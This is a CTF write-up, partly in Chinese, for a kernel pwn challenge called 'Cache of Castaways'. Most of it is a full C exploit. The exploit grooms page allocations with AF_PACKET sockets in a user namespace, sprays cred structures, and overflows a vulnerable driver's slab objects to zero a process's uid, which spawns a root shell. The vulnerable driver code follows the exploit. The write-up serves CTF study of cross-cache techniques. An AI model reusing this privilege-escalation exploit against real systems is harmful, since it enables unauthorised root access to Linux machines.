## Pwn



### Cache of Castaways



基本上完全參考[官方 writeup](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html) 來了解 cross cache attack 的使用方法與機制，而這個方法能夠在不需要 leak memory / ROP 的情況下做提權。



exp:

```c
// gcc -masm=intel -static -o exp exp.c

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sched.h>
#include <time.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <assert.h>
#include <sys/socket.h>
#include <sys/ioctl.h>

#define EDIT 0xF00DBABE
#define ALLOC 0xCAFEBABE

struct user_req_t {
    int64_t idx;
    int64_t size;
    char *data;
};

enum spray_cmd {
    ALLOC_PAGE,
    FREE_PAGE,
    EXIT_SPRAY,
};

struct ipc_req_t {
    enum spray_cmd cmd;
    int32_t idx;
};

struct tpacket_req {
    unsigned int    tp_block_size;
    unsigned int    tp_block_nr;
    unsigned int    tp_frame_size;
    unsigned int    tp_frame_nr;
};

enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

#define CRED_JAR_INITIAL_SPRAY 100
#define INITIAL_PAGE_SPRAY 1000
#define CRED_SPRAY 320
#define CHUNK_SIZE 0x200

int rootfd[2];
int sprayfd_child[2];
int sprayfd_parent[2];
int socketfds[INITIAL_PAGE_SPRAY];

static void panic(const char *msg)
{
    perror(msg);
    exit(1);
}

int64_t alloc(int fd)
{
    return ioctl(fd, ALLOC);
}

int64_t edit(int fd, int64_t idx, int64_t size, char *data)
{
    struct user_req_t req = { .idx=idx, .size=size, .data=data };
    return ioctl(fd, EDIT, &req);
}

__attribute__((naked)) pid_t __clone(uint64_t flags, void *dest)
{
    asm("mov r15, rsi\n"
        "xor rsi, rsi\n"
        "xor rdx, rdx\n"
        "xor r10, r10\n"
        "xor r9, r9\n"
        "mov rax, 56\n"
        "syscall\n"

        "cmp rax, 0\n"
        "jl bad_end\n"
        "jg good_end\n"
        "jmp r15\n"
        
        "bad_end:\n"
        "neg rax\n"
        "ret\n"
        
        "good_end:\n"
        "ret");
}

struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char throwaway;
char root[] = "root\n";
char binsh[] = "/bin/sh\x00";
char *args[] = {"/bin/sh", NULL};
__attribute__((naked)) void check_and_wait()
{
    asm(
        // read
        "lea rax, [rootfd]\n"
        "mov edi, dword ptr [rax]\n"
        "lea rsi, [throwaway]\n"
        "mov rdx, 1\n"
        "xor rax, rax\n"
        "syscall\n"
        
        // getuid
        "mov rax, 102\n"
        "syscall\n"
        
        "cmp rax, 0\n"
        "jne finish\n"
        
        // success --> execve
        "lea rdi, [binsh]\n"
        "lea rsi, [args]\n"
        "xor rdx, rdx\n"
        "mov rax, 59\n"
        "syscall\n"
        
        // failed --> nanosleep
        "finish:\n"
        "lea rdi, [timer]\n"
        "xor rsi, rsi\n"
        "mov rax, 35\n"
        "syscall\n"
        "ret");
}

void debug()
{
    puts("pause");
    getchar();
    return;
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int tmp_fd;
    char edit[0x100];

    // CLONE_NEWNS - unshare the mount namespace
    // CLONE_NEWUSER - unshare the user namespace
    // CLONE_NEWNET - unshare the network namespace
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    if (tmp_fd < 0)
        panic("[-] open setgroups failed");
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    // map formte: ID-inside-ns   ID-outside-ns   length
    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    if (tmp_fd < 0)
        panic("[-] open uid_map failed");
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    if (tmp_fd < 0)
        panic("[-] open gid_map failed");
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}

int alloc_pages_via_sock(uint32_t size, uint32_t n)
{
    struct tpacket_req req;
    int32_t socketfd, version;

    // we has became privileged user in new user namespace
    // so we can use type "SOCK_RAW"
    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socketfd < 0)
        panic("[-] create socket failed");

    version = TPACKET_V1;

    // PACKET_VERSION - to create another variant ring (v2, v3 ...)
    if (setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version)) < 0)
        panic("[-] setsockopt PACKET_VERSION failed");

    assert(size % 4096 == 0); // page alignment

    memset(&req, 0, sizeof(req));

    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    if (setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)) < 0)
        panic("[-] setsockopt PACKET_TX_RING failed");

    return socketfd;
}

void spray_comm_handler()
{
    struct ipc_req_t req;
    int32_t res;

    do {
        // read request
        read(sprayfd_child[0], &req, sizeof(req));

        if (req.cmd == ALLOC_PAGE)
            socketfds[req.idx] = alloc_pages_via_sock(4096, 1);
        else if (req.cmd == FREE_PAGE)
            close(socketfds[req.idx]);

        res = req.idx;
        write(sprayfd_parent[1], &res, sizeof(res));
    } while (req.cmd != EXIT_SPRAY);
}

void send_spray_cmd(enum spray_cmd cmd, int idx)
{
    struct ipc_req_t req;
    int32_t result;

    req.cmd = cmd;
    req.idx = idx;
    
    write(sprayfd_child[1], &req, sizeof(req));
    read(sprayfd_parent[0], &result, sizeof(result));
    
    assert(result == idx);
}

static int idle()
{
    sleep(1000000000);
}

// base 0xffffffffc0000000
int main()
{
    int fd = open("/dev/castaway", O_RDWR);
    if (fd < 0)
        panic("[-] open driver failed");

    pipe(sprayfd_child);
    pipe(sprayfd_parent);

    if (!fork())
    {
        unshare_setup(getuid(), getgid());
        spray_comm_handler();
        idle(); // never reach
    }
    pipe(rootfd);

    char evil[CHUNK_SIZE];
    memset(evil, 0, sizeof(evil));
    *(uint32_t*)&evil[CHUNK_SIZE - 0x6] = 1;

    puts("[+] draining cred_jar");
    for (int i = 0; i < CRED_JAR_INITIAL_SPRAY; i++)
    {
        pid_t pid = fork();
        if (!pid)
            idle();

        if (pid < 0) {
            panic("[-] fork failed");
        }
    }

    puts("[+] messaging order-0 buddy allocation");
    for (int i = 0; i < INITIAL_PAGE_SPRAY; i++)
        send_spray_cmd(ALLOC_PAGE, i);

    for (int i = 1; i < INITIAL_PAGE_SPRAY; i += 2)
        send_spray_cmd(FREE_PAGE, i);
        
    puts("[+] spray cred with new order-0 allocation");
    for (int i = 0; i < CRED_SPRAY; i++) {
        pid_t res = __clone(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND,
                            &check_and_wait);
        if (res < 0)
            panic("[-] clone failed");
    }

    for (int i = 0; i < INITIAL_PAGE_SPRAY; i += 2)
        send_spray_cmd(FREE_PAGE, i);

    puts("[+] spray cross cache overflow");
    // one page has 8 vuln object (0x200 * 8 == 0x1000)
    for (int i = 0; i < 400; i++) {
        if (alloc(fd) < 0)
            panic("[-] allocate vuln object failed");
    }

    for (int i = 0; i < 400; i++) {
        if (edit(fd, i, CHUNK_SIZE, evil) < 0)
            panic("[-] allocate vuln object failed");
    }

    puts("[+] overwrite down");
    write(rootfd[1], evil, CRED_SPRAY);

    idle();
}
```



```c
#define OVERFLOW_SZ 0x6
#define CHUNK_SIZE 512

typedef struct
{
    char pad[OVERFLOW_SZ];
    char buf[];
} castaway_t;

struct castaway_cache
{
    char buf[CHUNK_SIZE];
};

castaway_t **castaway_arr;
static struct kmem_cache *castaway_cachep;

static int init_castaway_driver(void)
{
    // ... register
    castaway_arr = kzalloc(MAX * sizeof(castaway_t *), GFP_KERNEL);
    castaway_cachep = KMEM_CACHE(castaway_cache, SLAB_PANIC | SLAB_ACCOUNT);
    return 0;
}

static long castaway_add(void)
{
    int idx;
    if (castaway_ctr >= MAX)
        return -1;

    idx = castaway_ctr++;
    castaway_arr[idx] = kmem_cache_zalloc(castaway_cachep, GFP_KERNEL_ACCOUNT);
    return idx;
}

static long castaway_edit(int64_t idx, uint64_t size, char *buf)
{
    char temp[CHUNK_SIZE];
    // ... check index and size
    copy_from_user(temp, buf, size);
    memcpy(castaway_arr[idx]->buf, temp, size);

    return size;
}
```


